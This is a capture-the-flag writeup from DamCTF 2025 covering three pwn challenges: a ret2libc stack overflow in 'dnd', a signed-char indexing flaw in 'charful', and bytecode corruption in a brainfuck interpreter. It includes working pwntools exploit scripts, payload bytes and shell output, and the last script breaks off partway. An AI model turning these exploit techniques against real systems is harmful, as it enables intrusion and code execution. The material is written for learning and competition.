---
title: DamCTF 2025 - Pwn Writeup
slug: damctf-2025-pwn-writeup
published: 2025-05-11
author: kako57
description: Writeups for dnd, charful, brain-a-tac
---

## Introduction

Hello, I'm kako57, and I'm a member of the team *L3ak*.

So this weekend I played DamCTF 2025 with L3ak and we got third place overall with a full clear on all the challenges! Yay!

I did all the three pwn challenges with my teammate, White, and here are the solution ideas for every challenge

## pwn/dnd

> Dungeons and Dragons is fun, but this is DamCTF! Come play our version

The binary basically gives you five rounds in a game simulator, and for each turn you have a choice whether to attack or run. After five turns, it will tell you if you win or not.

```
# ./dnd
##### Welcome to the DamCTF and Dragons (DnD) simulator #####
Can you survive all 5 rounds?

>>> Round 1
Points: 0 | Health: 10 | Attack: 5
New enemy! You are now facing off against: Glitchkin the Gremlin (2 health, 1 damage)
Do you want to [a]ttack or [r]un? a
You defeated the monster!

>>> Round 2
Points: 2 | Health: 10 | Attack: 6
New enemy! You are now facing off against: Skulleater the Ogre (6 health, 2 damage)
Do you want to [a]ttack or [r]un? a
Oof, that hurt ;(

>>> Round 3
Points: -4 | Health: 8 | Attack: 6
New enemy! You are now facing off against: Glitchkin the Gremlin (1 health, 2 damage)
Do you want to [a]ttack or [r]un? a
You defeated the monster!

>>> Round 4
Points: -3 | Health: 8 | Attack: 7
New enemy! You are now facing off against: Cragmar the Ogre (5 health, 3 damage)
Do you want to [a]ttack or [r]un? a
You defeated the monster!

>>> Round 5
Points: 2 | Health: 8 | Attack: 8
New enemy! You are now facing off against: Stonefist the Ogre (6 health, 3 damage)
Do you want to [a]ttack or [r]un? a
You defeated the monster!
You lost! Too bad, better luck next time.
```

If you win, the *win()* function is called, which has an fgets call vulnerable to a buffer overflow:

```
[0x0040286d]> x/20i
0x0040286d   rip:
0x0040286d             f30f1efa  endbr64
0x00402871                   55  push rbp
0x00402872               4889e5  mov rbp, rsp
0x00402875                   53  push rbx
0x00402876             4883ec58  sub rsp, 0x58              ;; stack frame is this big
0x0040287a           bea8504000  mov esi, str.Congratulations__Minstrals_will_sing_of_your_triumphs_for_millenia_to_come.
0x0040287f           bfc0814000  mov edi, obj.std::cout
0x00402884           e867fbffff  call method.std::basic_ostream_char__std::char_traits_char____std::operator____std.char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_
0x00402889           be40234000  mov esi, method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____
0x0040288e               4889c7  mov rdi, rax
0x00402891           e88afbffff  call sym.imp.std::ostream::operator___std::ostream____std::ostream__
0x00402896           bef8504000  mov esi, str.What_is_your_name__fierce_warrior_
0x0040289b           bfc0814000  mov edi, obj.std::cout
0x004028a0           e84bfbffff  call method.std::basic_ostream_char__std::char_traits_char____std::operator____std.char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_
0x004028a5       488b15d4580000  mov rdx, qword [rip + 0x58d4]
0x004028ac             488d45a0  lea rax, [rbp - 0x60]       ;; drec: buffer is only 0x60 bytes away from saved rbp
0x004028b0           be00010000  mov esi, 0x100
0x004028b5               4889c7  mov rdi, rax
0x004028b8           e813fcffff  call sym.imp.fgets          ;; drec: calls fgets with n=0x100
```

Running checksec we see that there is no stack canary, and the binary is not PIE:

```
# pwn checksec dnd
[*] '/shared/dnd/dnd'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This means we can do a classic ret2libc exploit. But to get to *win()*, we have to satisfy conditions to win the game! Luckily, it's not that hard to win the game by chance, even if you randomly mash the `a` or `r`. I decided that for my exploit, I'm going to run for four rounds, then attack at the last one. This means that my exploit is not so reliable, but with a few tries it ends up working!

```python
from pwn import *

elf = context.binary = ELF("./dnd")
libc = ELF("./libc.so.6")

if args.REMOTE:
    io = remote("dnd.chals.ctfstaging.detjens.dev", 30813)
else:
    io = elf.process()

io.sendline(b'r')
io.sendline(b'r')
io.sendline(b'r')
io.sendline(b'r')
io.sendline(b'a')

io.recvuntil(b'What is your name, fierce warrior? ')

ntr = b'A' * 0x68

# 0x0000000000402640 : pop rdi ; nop ; pop rbp ; ret
pop_rdi_rbp = 0x402640
rop_chain = b''.join(map(p64, [
    pop_rdi_rbp,
    elf.got['puts'],
    0x4141414141414141,
    elf.plt['puts'],
    elf.sym['_Z3winv']
    ]))

io.sendline(ntr + rop_chain)

io.recvuntil(b'We will remember you forever, ')
io.recvline()

libc_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
info(f'{hex(libc_leak)=}')

libc.address = libc_leak - libc.sym['puts']
info(f'{hex(libc.address)=}')

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))
io.sendline(ntr + rop.chain())

io.interactive()
```

Running it enough times (not a lot, I promise) we get this:

```
# python3 exploit.py REMOTE
[*] '/shared/dnd/dnd'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/shared/dnd/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to dnd.chals.ctfstaging.detjens.dev on port 30813: Done
[*] hex(libc_leak)='0x7efc387a4be0'
[*] hex(libc.address)='0x7efc3871d000'
[*] Loaded 111 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
Congratulations! Minstrals will sing of your triumphs for millenia to come.
What is your name, fierce warrior? We will remember you forever, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x906F\x18\x00\x00
$ ls
dnd
flag
$ cat flag
dam{w0w_th0s3_sc4ry_m0nster5_are_w3ak}
$
```

All failed attempts to win result in an EOFError.

## pwn/charful

> // TODO: learn how integer conversions work

That is the description of the challenge, so White, my teammate and I looked into the source code as to where that vulnerable integer conversion might be, but there doesn't seem to be anything vulnerable in the source.

The flag is being read by the program though, so there has to be some way of performing negative indexing around the data that we can inspect with the function *print_todo()*. White, my teammate, found that the bounds checks for the index used in most, if not all, todo-related functions have removed the checks for whether the value less than zero.

According to the author, the `char` type is unsigned by default on ARM. While the Makefile suggests that the `-fsigned-char` flag is used, it only applies to the file *main.c*, but not *todos.c*.

Now, it's just a matter of finding the correct offset for the flag.

> White: I'll try just printing the flag for now, which is index -65
> Me: *tries -65*
> Me: *fails*
> White: 4294967231, try that

```
nc charful.chals.damctf.xyz 30128


1. Add a TODO
2. Print a TODO
3. Mark a TODO as completed
4. Edit a TODO
5. Check for incomplete TODOs
6. Exit
What would you like to do? 4294967231
Invalid choice.


7. Add a TODO
8. Print a TODO
9. Mark a TODO as completed
10. Edit a TODO
11. Check for incomplete TODOs
12. Exit
What would you like to do? 2
Which TODO would you like to print? 4294967231
// TODO: e over that way -------------> dam{dont_you_love_to_play_with_fun_signed_chars} (done!)
```

## pwn/brain-a-tac

I love brainfuck challenges because I know it by heart, unless it's the 5D variant with time-travel. Thankfully, this challenge only concerns the standard brainfuck spec... is there even a spec for this?

> `>,[[>],[<]>-]-[>]-[<.+]++++++++++.`

The line above was the original description. I think it what it meant was not clear for the other players, so the organizers decided to replace it:

> server is running `./bf ">,[[>],[<]>-]-[>]-[<.+]++++++++++."`

The program, *bf*, takes an argument, describing a brainfuck program. As clarified in the updated description, we do not control what program to run, and we're stuck with what is in the description.

### Program analysis

```brainfuck
>,[[>],[<]>-]-[>]-[<.+]++++++++++.
```

The program first spares the cell 0 to be empty, then it reads a byte and stores its value at cell 1. Whatever this value is, let's call it N for now. Then, the program reads N bytes for the next N cells, while decrementing the value in cell 1 (this is used to determine whether it already read N bytes). Then, once it's done reading N bytes (or when value in cell 1 is 0), it will decrement cell 1 and the cell after the last byte, then start printing the bytes in reverse order, incrementing their values immediately after they get printed. Then, it reaches the cell 1, which would be of value FF, which also gets printed (`\xff`) and incremented, turning its value to zero, and ending the loop. The program then increments the value of cell 1 to 0A, which gets printed as a newline.

```
# printf "\x0a0123456789" | ./bf_patched ">,[[>],[<]>-]-[>]-[<.+]++++++++++." | hexdump -C
00000000  39 38 37 36 35 34 33 32  31 30 ff 0a              |9876543210..|
0000000c
```

### Technical mechanism of the brainfuck interpreter

The binary *bf* is a brainfuck interpreter which takes the brainfuck program as a command-line argument, compiles it to VM bytecode, which is passed with an initial program state to a function that subsequently executes the compiled bytecode.

The program state can be represented as a struct:

```c
struct ProgramState
{
    uint8_t mem[0x80];              // the cells 
    uint32_t program_opcodes[0x7f]; // the program code resides here
    uint16_t mp;                    // memory pointer
    uint16_t ip;                    // instruction pointer
};
```

Every instruction in the VM is 32-bits wide. The instructions are the following:
```
H------L
XXXXXX00 nop              ; increments ip
XXXXXX01 inc mp           ; increments mp
XXXXXX02 dec mp           ; decrements mp
XXXXXX03 putc [mp]        ; prints character at mem[mp]
XXXXXX04 getc [mp]        ; reads char and stores at mem[mp]
XXXXXX05 inc [mp]         ; increments value at mem[mp]
XXXXXX06 dec [mp]         ; decrements value at mem[mp]
OPNOXX07 jz               ; sets ip to OPNO if mem[mp] == 0
OPNOXX08 jnz              ; sets ip to OPNO if mem[mp] != 0
```

If the lowest 8 bits do not decode to any instruction, the default cases covers for it, and acts as a no-op instruction.

NOTE: XX in this case are bytes in the VM code that are not necessary in decoding the instruction, and can contain any value without changing the effects of the instruction.

The program terminates when the instruction pointer, *ip* reaches a value greater than or equal to 0x7F.

The program state resides in the *main()* function's stack frame
```
...
ProgramState state
uint64_t canary
uint64_t saved_rbp
uint64_t return_address
```

The program also contains flags that cannot be modified through user input, and disabled by default, which, if enabled, can print debugging information. I did patch the program to enable the flags and tried to make good use of it, but White wants to have a dump of the VM code for analysis. In the end, we decided not to use the program's built-in (but disabled) debugging mechanism. 

### The vulnerability

An improper validation of input vulnerability exists in the brainfuck program. After the first byte is read from the user input, it will then receive bytes based on the value of the first byte read. However, in order to decrement the counter in cell 1, the byte sent by the user requires to be non-null. Should the user decide to send a null byte, the movement of the memory pointer to the left does not proceed, and the memory pointer gets moved to the right instead, and proceeds to continue with the outer loop. This vulnerability can then be abused to continue writing past the space allocated for the brainfuck memory, allowing for stack buffer-based overflow.

### Cooking a debugger

When I was working on the challenge with White, he complained about how hard it is to work with the binary. Here are some of the stuff that he said about:

> ughh i think this will be a bit of a pain to work with
> which of the 4 bytes of the program is the opcode ... and the args
> this looks to be a pain to work with lol
> can we just use a debugger to dump the opcodes generated

It is never a sin to complain, and I'm sure that the other teams also had their own frustrations with analyzing this binary, especially considering that this is a pwn challenge, which means you'll have to analyze this dynamically. Most of the time I spent on this challenge was poured into creating tooling and reach enough of a foothold to pass to White.

I used [libdebug](https://github.com/libdebug/libdebug) to create a debugger for the program. It shows all the memory touched by the VM, the code instructions, the register values, and even "extras" - the canary, saved rbp, and return address. The `hexdump` library is also used so we can have a hexdump.

```python
#!/usr/bin/env python3

from libdebug import debugger
from hexdump import hexdump
import struct
import sys

d = debugger(argv=["./bf_patched", ">,[[>],[<]>-]-[>]-[<.+]++++++++++."], aslr=True)

def decode_insn(t, ip):
    opcode = struct.unpack('<I', t.memory[t.regs.rdi + 0x80 + (ip * 4), 0x4])[0]
    op = opcode & 0xff

    # jmp_loc = opcode >> 0x10
    # I ended up using the formula below
    # because I reached a point
    # where I'm touching the code relative to mem
    jmp_loc = 0x80 + (opcode >> 0x10) * 4
    match op:
        case 0:
            return f'{opcode:08x}' + '\t' + 'nop\t(ip++)'
        case 1:
            return f'{opcode:08x}' + '\t' + 'inc\tmp'
        case 2:
            return f'{opcode:08x}' + '\t' + 'dec\tmp'
        case 3:
            return f'{opcode:08x}' + '\t' + 'putc\t[mp]'
        case 4:
            return f'{opcode:08x}' + '\t' + 'getc\t[mp]'
        case 5:
            return f'{opcode:08x}' + '\t' + 'inc\t[mp]'
        case 6:
            return f'{opcode:08x}' + '\t' + 'dec\t[mp]'
        case 7:
            return f'{opcode:08x}' + '\t' + f'jz\t0x{jmp_loc:x}'
        case 8:
            return f'{opcode:08x}' + '\t' + f'jnz\t0x{jmp_loc:x}'
        case _:
            return f'{opcode:08x}' + '\t' + 'nop\t(ip++)'

max_mp = 0

def dump_state(t, bp):
    '''
    async callback function that dumps the program state
    '''
    global max_mp

    # we look at a larger region because we can go beyond mem with mp
    mem = t.memory[t.regs.rdi, 0x1000]
    insn = t.memory[t.regs.rdi + 0x80, 0x4 * 0x7f].rstrip(b'\x00' * 4)
    # please forgive my math
    mp = struct.unpack('<H', t.memory[t.regs.rdi + 0x80 + 0x4 * 0x7f, 0x2])[0]
    ip = struct.unpack('<H', t.memory[t.regs.rdi + 0x80 + 0x4 * 0x7f + 0x2, 0x2])[0]
    canary = struct.unpack('<Q', t.memory[t.regs.rdi + 0x80 + 0x4 * 0x7f + 0x4, 8])[0]
    saved_rbp = struct.unpack('<Q', t.memory[t.regs.rdi + 0x80 + 0x4 * 0x7f + 0x4 + 0x8, 8])[0]
    return_address = struct.unpack('<Q', t.memory[t.regs.rdi + 0x80 + 0x4 * 0x7f + 0x4 + 0x8 + 0x8, 8])[0]

    # NOTE: we exit early for now, so that we don't see a ton of logs for nops
    # not like we'll need the entire code dump
    # just comment this if you know you go beyond ip=0x21
    if ip > 0x21:
        return

    # we show as many bytes as how far mp has went overall
    max_mp = max(max_mp, mp)

    dat = '\n'.join([
        '----------------------------------------------------------------------------',
        f"MEMORY: 0x{t.regs.rdi:016x}",
        hexdump(mem[:(max_mp + 0xf) // 0x10 * 0x10], 'return'),
        f"CODE:   0x{t.regs.rdi+0x80:016x}",
        *[f'{0x80 + (i*4):4x}: ' + decode_insn(t, i) + '\t<- ip' * (ip == i) for i in range(min(0x80, len(insn) // 4) + 1)],
        "REGISTERS:",
        f'mp: 0x{mp:02x} -> 0x{mem[mp]:02x}',
        f'ip: 0x{ip:02x} -> {decode_insn(t, ip)}',
        f"EXTRAS:",
        f'   canary: 0x{canary:016x}',
        f'saved rbp: 0x{saved_rbp:016x}',
        f' ret addr: 0x{return_address:016x}',
    ]) + '\n'

    # this ansi escape sequence is the same exact sequence used in gdb-gef
    # that allows you to move all past output above the terminal window (scroll up for previous output!)
    # we print to stderr so we don't see weird bytes should we decide to redirect output to a file
    sys.stderr.write('\33[H\33[2J')
    sys.stderr.flush()

    sys.stdout.write(dat)
    sys.stdout.flush()


# run doesn't actually run the binary.
io = d.run()

# libdebug WILL realize that this is a binary-relative address
# and the set the breakpoint at the correct address
# the callback is called asynchronously
d.breakpoint(0x1939, callback=dump_state)

# this is when the program is actually run
d.cont()

# your pwntools-like communication starts here
io.send(b'\x05Hello')
# this gets printed (promise!), but because the breakpoint is async and there might be a ton of nops, you might not see it
print('output:', io.recv(10))

# you can also import pwntools here from pwn import p8, u8, p32, cyclic
# basically cyclic and packing/unpacking stuff... the typical utilities
# but usually pwntools doesn't like working with libdebug

# wait for the program to finish (if it even finishes)
d.wait()
```

Here's what it would look like if you run it (with the example I/O stuff I included):

```
----------------------------------------------------------------------------
MEMORY: 0x00007ffda658a5d8
00000000: 00 0A 49 66 6D 6D 70 FF  00 00 00 00 00 00 00 00  ..Ifmmp.........
CODE:   0x00007ffda658a658
  80: 00000001  inc     mp
  84: 00000004  getc    [mp]
  88: 000d0007  jz      0xb4
  8c: 00060007  jz      0x98
  90: 00000001  inc     mp
  94: 00040008  jnz     0x90
  98: 00000004  getc    [mp]
  9c: 000a0007  jz      0xa8
  a0: 00000002  dec     mp
  a4: 00080008  jnz     0xa0
  a8: 00000001  inc     mp
  ac: 00000006  dec     [mp]
  b0: 00030008  jnz     0x8c
  b4: 00000006  dec     [mp]
  b8: 00110007  jz      0xc4
  bc: 00000001  inc     mp
  c0: 000f0008  jnz     0xbc
  c4: 00000006  dec     [mp]
  c8: 00170007  jz      0xdc
  cc: 00000002  dec     mp
  d0: 00000003  putc    [mp]
  d4: 00000005  inc     [mp]
  d8: 00130008  jnz     0xcc
  dc: 00000005  inc     [mp]
  e0: 00000005  inc     [mp]
  e4: 00000005  inc     [mp]
  e8: 00000005  inc     [mp]
  ec: 00000005  inc     [mp]
  f0: 00000005  inc     [mp]
  f4: 00000005  inc     [mp]
  f8: 00000005  inc     [mp]
  fc: 00000005  inc     [mp]
 100: 00000005  inc     [mp]
 104: 00000003  putc    [mp]    <- ip
REGISTERS:
mp: 0x01 -> 0x0a
ip: 0x21 -> 00000003    putc    [mp]
EXTRAS:
   canary: 0x98d5461b906e3b00
saved rbp: 0x00007ffda658a900
 ret addr: 0x00007f7b5fe2a3b8
output: b'olleH\xff\n'
```

You can scroll up to see previous program states.

### Strategy

First, we need to fill the memory, so that we can start overwriting the bytecode. To do that, we repeatedly send a non-null byte followed by a null-byte. This causes the memory pointer to slowly but surely drift to higher addresses and reach the code segment of the program state.

Then, the most complicated part: sending inputs to tamper the bytecode.

My initial idea is that we want to have some form of loop that does this:

```
loop:
getc [mp]
inc mp
jmp loop
```

While this is good, there are problems with this idea:
1. This does not give us an info leak. The binary is PIE, and there is ASLR for sure, so we need to leak addresses if we want to make our infinite read loop useful.
2. The VM has no concept of absolute jump! There is only jump if zero and jump if not zero, which means we have to at least define two jumps.
3. Suppose we get jz and jnz to jump back to the same instruction, well, now we have a problem because we end with an uncontrollable loop, where we cannot stop the read loop when we want to. This causes problems, because we might end up going beyond the memory range for the stack, leading to an unexploitable segmentation fault condition.

To resolve this, we want our loop to have the following properties:
- A loop that sends us the current byte value at the current cell, **before** we send the updated byte value. This allows us to preserve values in memory when needed, and also serves as an information leak primitive, while also keeping the out-of-bounds write primitive.
- A loop that doesn't care if it reads null or non-null bytes from user input. 
- A loop that allows us to break out of it when we want to.

Once we get such a loop, we can freely write anything, either by putting some "stage 2" bytecode that will be run after the loop, or just straight up proceed to writing a ROP chain to spawn a shell and get the flag. 

### Crafting the loop with desirable conditions

As much as I wanted to just dump the payload here, I will walk you through it with some explanation of what every part is for. You might think that I will have a good explanation for this part, but nope. I have a debugger written for you, so you can try to reverse-engineer my brain and figure out how I even got the payload for this part.

First we start with this:

```python
io.send(b'\xff\x00' * 0x2b)
```

This fills the memory, partially tampering with the first bytecode instruction, but it doesn't change program behaviour:

```
CODE:   0x00007ffe6e7ef2d8
  80: 00ff0001  inc     mp
  84: 00000004  getc    [mp]
  88: 000d0007  jz      0xb4
  8c: 00060007  jz      0x98
  90: 00000001  inc     mp
  94: 00040008  jnz     0x90
  98: 00000004  getc    [mp]    <- ip
  9c: 000a0007  jz      0xa8
  a0: 00000002  dec     mp
  a4: 00080008  jnz     0xa0
  a8: 00000001  inc     mp
  ac: 00000006  dec     [mp]
  b0: 00030008  jnz     0x8c
  b4: 00000006  dec     [mp]
  ...
REGISTERS:
mp: 0x83 -> 0x00
ip: 0x06 -> 00000004    getc    [mp]
```

As shown in the output, *mp* is now at 0x83, and cell 0x82 is 0xff (doesn't change anything)

```
  8c: 00060007  jz      0x98
  90: 00000001  inc     mp
  94: 00040008  jnz     0x90
  98: 00000004  getc    [mp]    <- ip
  9c: 000a0007  jz      0xa8
  a0: 00000002  dec     mp
  a4: 00080008  jnz     0xa0
  a8: 00000001  inc     mp
  ac: 00000006  dec     [mp]
  b0: 00030008  jnz     0x8c
```

---

We now add some more bytes to the payload:

```python
io.send(b'\x01\x00\x04\x01\x00\x41\x07')
```

The goal of this is to fill some more bytes to prepare for a targeted decrement of an opcode.

```
CODE:   0x00007ffcd97ce378
  80: 01fe0001  inc     mp
  84: 04fd0004  getc    [mp]
  88: 000d0107  jz      0xb4
  8c: 00064107  jz      0x98
  90: 00000001  inc     mp
  94: 00040008  jnz     0x90
  98: 00000004  getc    [mp]    <- ip
  9c: 000a0007  jz      0xa8
  a0: 00000002  dec     mp
  a4: 00080008  jnz     0xa0
  a8: 00000001  inc     mp
  ac: 00000006  dec     [mp]
  b0: 00030008  jnz     0x8c
  b4: 00000006  dec     [mp]
  ...
REGISTERS:
mp: 0x8f -> 0x00
ip: 0x06 -> 00000004    getc    [mp]
```

---

We fire one byte to cause modify one of the instructions!

```python
io.send(b'\x01')
```

We have changed the instruction at `mem[0x8c]` from a `jz` to an `inc [mp]` instruction. This is still not useful, though.

```
CODE:   0x00007fff18d48868
  80: 01fe0001  inc     mp
  84: 04fd0004  getc    [mp]
  88: 000d0107  jz      0xb4
  8c: 01064105  inc     [mp]
  90: 00000001  inc     mp
  94: 00040008  jnz     0x90
  98: 00000004  getc    [mp]    <- ip
  9c: 000a0007  jz      0xa8
  a0: 00000002  dec     mp
  a4: 00080008  jnz     0xa0
  a8: 00000001  inc     mp
  ac: 00000006  dec     [mp]
  b0: 00030008  jnz     0x8c
  b4: 00000006  dec     [mp]
  ...
REGISTERS:
mp: 0x91 -> 0x00
ip: 0x06 -> 00000004    getc    [mp]
```

---

What happens if we fire again?

```python
io.send(b'\x01')
```

Turns out that we decrement the same instruction down to a `getc [mp]`!

```
CODE:   0x00007ffc8181bed8
  80: 01fe0001  inc     mp
  84: 04fd0004  getc    [mp]
  88: 000d0107  jz      0xb4
  8c: 01064104  getc    [mp]    <- ip
  90: 00000101  inc     mp
  94: 00040008  jnz     0x90
  98: 00000004  getc    [mp]
  9c: 000a0007  jz      0xa8
  a0: 00000002  dec     mp
  a4: 00080008  jnz     0xa0
  a8: 00000001  inc     mp
  ac: 00000006  dec     [mp]
  b0: 00030008  jnz     0x8c
  b4: 00000006  dec     [mp]
  ...
REGISTERS:
mp: 0x8c -> 0x04
ip: 0x03 -> 01064104    getc    [mp]
```

Notice where mp points to. I want to keep this getc for later, so I must preserve that instruction.

---

Now we send the next bytes to satisfy one of our conditions: leak info before receiving input

```python
io.send(b'\x04\x00\x00\x01\x03')
```

We modified the jump at 0x94 to have a `putc [mp]`!

```
CODE:   0x00007ffef7bc1db8
  80: 01fe0001  inc     mp
  84: 04fd0004  getc    [mp]
  88: 000d0107  jz      0xb4
  8c: 01064104  getc    [mp]
  90: 00000101  inc     mp
  94: 00040103  putc    [mp]
  98: 00000004  getc    [mp]    <- ip
  9c: 000a0007  jz      0xa8
  a0: 00000002  dec     mp
  a4: 00080008  jnz     0xa0
  a8: 00000001  inc     mp
  ac: 00000006  dec     [mp]
  b0: 00030008  jnz     0x8c
  b4: 00000006  dec     [mp]
  ...
REGISTERS:
mp: 0x95 -> 0x01
ip: 0x06 -> 00000004    getc    [mp]
```

---

The next few bytes are to preserve the `getc [mp]` instruction at 0x98, and then change the jump at 0x9c. 

```python
io.send(b'\x00\x01\x00\x04\x00\x00\x00\x08\x01\x04')
```

We now flip the jump condition after the `putc [mp]` and `getc [mp]`, turning it from `jz` to `jnz`. We also changed the jump location to 0x90!

```
CODE:   0x00007ffed9243188
  80: 01fe0001  inc     mp
  84: 04fd0004  getc    [mp]
  88: 000d0107  jz      0xb4
  8c: 01064104  getc    [mp]
  90: 00000101  inc     mp
  94: 00010003  putc    [mp]
  98: 00000004  getc    [mp]    <- ip
  9c: 00040108  jnz     0x90
  a0: 00000002  dec     mp
  a4: 00080008  jnz     0xa0
  a8: 00000001  inc     mp
  ac: 00000006  dec     [mp]
  b0: 00030008  jnz     0x8c
  b4: 00000006  dec     [mp]
  ...
REGISTERS:
mp: 0x9f -> 0x00
ip: 0x06 -> 00000004    getc    [mp]
```

So now, we almost have a loop we can work with. As long as the bytes we send are not zero, we can keep writing bytes to memory continuously.

---

I now flip it back that same jump back to jz...

```python
io.send(b'\x00\x07\x00\x05\x04\x00')
```

The bytes sent also make sure that the jump target is preserved:

```
CODE:   0x00007ffcf090a7f8
  80: 01fe0001  inc     mp
  84: 04fd0004  getc    [mp]
  88: 000d0107  jz      0xb4
  8c: 01064104  getc    [mp]
  90: 00000101  inc     mp
  94: 00010003  putc    [mp]
  98: 00000004  getc    [mp]    <- ip
  9c: 00040007  jz      0x90
  a0: 00000002  dec     mp
  a4: 00080008  jnz     0xa0
  a8: 00000001  inc     mp
  ac: 00000006  dec     [mp]
  b0: 00030008  jnz     0x8c
  b4: 00000006  dec     [mp]
  ...
REGISTERS:
mp: 0xa0 -> 0x02
ip: 0x06 -> 00000004    getc    [mp]
```

Why did I flip it back? Honestly I'm not sure anymore. I think it's so that I end up using the `getc [mp]` instruction at 0x84 to modify the jump instruction. This keeps things stable.

Anyway, it is important that I optimize for sending null bytes, because we will need to send a lot of them when we go to the program's nop sled later on. So this has to be a `jz` instruction

---

Finally, we have our `jnz` to complement our `jz` at 0x9c, giving us an infinite read loop!

```python
io.send(b'\x08\x01\x00\x01\x01\x01')
```

Notice that the `jz` and `jnz` instructions at 0x9c and 0xa0 have different jump targets.

```
CODE:   0x00007fffb0c90448
  80: 01fe0001  inc     mp
  84: 04fd0004  getc    [mp]
  88: 000d0107  jz      0xb4
  8c: 01064104  getc    [mp]
  90: 00000101  inc     mp
  94: 00010003  putc    [mp]
  98: 00000004  getc    [mp]    <- ip
  9c: 00040007  jz      0x90
  a0: 00010008  jnz     0x84
  a4: 00080008  jnz     0xa0
  a8: 00000001  inc     mp
  ac: 00000006  dec     [mp]
  b0: 00030008  jnz     0x8c
  b4: 00000006  dec     [mp]
  ...
REGISTERS:
mp: 0xa3 -> 0x00
ip: 0x06 -> 00000004    getc    [mp]
```

We now have an read loop! Although passing stuff to it can be complicated...

```
  84: 04fd0004  getc    [mp]            ; this is our "kill switch"
  88: 000d0107  jz      0xb4            ; this leads to program exit
  8c: 01064104  getc    [mp]            ; we can "confirm" the input here
  90: 00000101  inc     mp
  94: 00010003  putc    [mp]            ; info leak
  98: 00000004  getc    [mp]    <- ip   ; read from input
  9c: 00040007  jz      0x90            ; if zero, just keep reading
  a0: 00010008  jnz     0x84            ; otherwise, "confirm" the input
  a4: 00080008  jnz     0xa0
```

While the loop can read infinitely, we don't want that. We want to be able to break out of the loop when we want.

How do we work with this loop? We can make some rules:
- if we want to write a null byte, send one null byte
- if we want to write a non-null byte, we can send the same byte value three times!
	- technically you only need to send any non-null byte twice, then send the actual value, but why complicate things... this writeup is already too long
- if we want the program to stop asking for input, we send any non-null byte, followed by a null byte.

And with that, we have our OOB read/write primitive! We can overwrite the stack, bytecode, or anything in the stack region after the program state struct. Obviously, we have to be careful messing with the `mp` and `ip` registers, because we will end up clobbering them with this primitive, but we can account for that in our exploit.

### Solutions

After I got this primitive, I went on to sleep, hoping that White will wake up and come up with a solution. He did solve it about 30 minutes after he saw my work :)

Another teammate of ours asked what the final payload would look like, and White is like "you got this" and didn't send solve script, because he thinks we're all clever like him... so I wrote my own exploit lol

#### My solution - stage 2 bytecode + writing ROP chain in reverse

The concept is simple. We use the primitive I've created to do two things:
1. Leak libc address to generate our ROP chain
2. Write another VM bytecode, this time only a write loop (we don't need to leak another time, we just need to write)

This new loop will have the same logic as the one we crafted for our primitive, but it will be decrementing *mp* instead of incrementing, so we will need to write our ROP chain in reverse. Writing this second loop is much easier, because we don't have to deal with weird interactions with the rest of the bytecode anymore.

Once we get the info leak on the first pass, we simply write our ROP chain for the second pass, tell the second loop to stop reading, which would cause the program to finish interpreting, triggering our ROP chain that spawns the shell.

#### White's solution (clever one)

The reason why I decided to go for a stage 2 was because I thought that I would need to have a libc leak first to calculate for ROP chain entries properly. Technically, I can do the whole thing in one go, where I account for carries and stuff, but White had a clever idea.

The phenomenon with ret2libc these days is the necessary `ret` gadget for modern 64-bit Linux platforms. This is due to *system()* requiring stack alignment? Why does it need stack alignment? The answer is SIMD. If you end up with a segfault in a ret2libc challenge, check where that segfault happened. If you see a SIMD instruction, simply put a `ret` gadget before your ROP chain for `system("/bin/sh")` and watch it work flawlessly.

White, being the pwn.college grinder that he is, definitely took notes of the ROP module and decided to look for a `ret` gadget close to the return address of main (it would be something like `__libc_start_main + some_offset`, libcdb calls it `libc_start_main_ret`). For this challenge, that address is libc's base address + 0x2a3b8.

```
# ROPgadget --all --binary libc.so.6 | grep "0x000000000002a3.. : ret"
0x000000000002a334 : ret
```

And just like that, he hit the jackpot. Now, he only needs to send that lowest byte (0x34), read the rest of the libc address, derive the libc base address, generate the ROP chain, then proceed with the usual stuff.

### Solve scripts

I placed here both White's and my solution. We used pwninit to get a patched binary that works with the libc; that is why you will see *bf_patched* instead of *bf*.

#### The vulnerability researcher's solution (drec)

For some reason that I haven't really investigated, there might be times when remote starts giving chars in short bursts... When that happens, I just re-run the script.

Running with remote target prints the flag for you. Running a local process spawns an interactive shell.

```python
#!/usr/bin/env python3
from pwn import *
import sys

elf = context.binary = ELF("./bf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

if args.REMOTE:
    io = remote('brain-a-tac.chals.damctf.xyz', 31337)
else:
    io = process([elf.path, ">,[[>],[<]>-]-[>]-[<.+]++++++++++."], aslr=False)

def real_send(bv: bytes):
    if bv != b'\x00':
        io.send(bv * 3)
    else:
        io.send(bv)

def stop_reading(bv = b'1'):
    io.send(bv + b'\x00')

info("modifying bytecode to get an info leak loop")
# fill the mem
io.send(b'\xff\x00' * 0x2b
        +
        b'\x01\x00\x04\x01\x00\x41\x07\x01'
        b'\x01\x04\x00\x00\x01\x03\x00\x01'
        b'\x00\x04\x00\x00\x00\x08\x01\x04'
        b'\x00\x07\x00\x05\x04\x00\x08\x01'
        b'\x00\x01\x01\x01')
success("bytecode modified! we now have info leak loop")

'''
We end up with this nice information leak and some nice memory write primitive
but I won't use this write primitive for ROP,
but I will use it to write another bytecode for another memory write

CODE:   0x00007fffffffe168
...
  84: 04fd0004  getc    [mp]
  88: 000d0107  jz      0xb4
  8c: 01064104  getc    [mp]
  90: 00000101  inc     mp
  94: 00010003  putc    [mp]
  98: 00000004  getc    [mp]
  9c: 00040007  jz      0x90
